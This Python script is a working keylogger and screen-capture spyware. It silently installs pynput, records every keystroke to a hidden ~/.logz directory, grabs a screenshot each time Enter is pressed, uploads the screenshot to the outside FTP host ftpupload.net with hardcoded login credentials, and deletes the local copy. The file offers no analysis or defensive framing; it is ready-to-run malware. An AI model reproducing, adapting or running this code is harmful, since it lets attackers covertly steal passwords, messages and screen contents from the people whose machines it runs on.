import time
from ftplib import FTP
from pathlib import Path
import random
import urllib.request
import os
try:
    import pynput
except:
       os.system("python3 -m pip install pynput -q -q -q")
       import pynput
       
from pynput import keyboard
from PIL import ImageGrab 
IPAddr = urllib.request.urlopen('https://ident.me').read().decode('utf8')
t = time.localtime()
timestamp = time.strftime('%b-%d-%Y', t)
PATH = '/home/'+os.getlogin()+'/.logz/'
hellarea = random.randint(0, 100)
hellar = str(hellarea)
fileab = PATH+IPAddr+ timestamp+ hellar +"-templog.txt"
def stage1():
    isExist = os.path.exists(PATH)
    if not isExist:
        os.makedirs(PATH)
    fle = Path(fileab)
    fle.touch(exist_ok=True)    
    stage3()
def stage3():
    def write(text):
        with open(fileab, 'a') as f:
            f.write(text)
            f.close()

    def on_key_press(Key):
        try:
            if (Key == keyboard.Key.enter):
                stage2()
            else:
                write(Key.char)
        except AttributeError:
            if Key == keyboard.Key.backspace:
                write(" <back space> \n")
            elif (Key == keyboard.Key.tab):
                write(" <tab> \n")
            elif (Key == keyboard.Key.space):
                write(" <space> \n");
            else:
                temp = repr(Key)
                write(temp)
    def on_key_release(Key):
        if (Key == keyboard.Key.esc):
            stage1()
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()
def stage2():

    snapshot = ImageGrab.grab()
    BACKUP_NAME = (IPAddr + timestamp + hellar + "enterpress-.jpg")
    snapshot.save(PATH + '/' + BACKUP_NAME)
    file_path = Path(PATH + '/' + BACKUP_NAME)

    with FTP('ftpupload.net', 'unaux_32859587', 'fnlmn6pls') as ftp, open(file_path, 'rb') as file:
        ftp.storbinary(f'STOR {file_path.name}', file)
    os.remove(file_path)
    time.sleep(1)
    stage3()
def catc():
    stage1()    
catc()


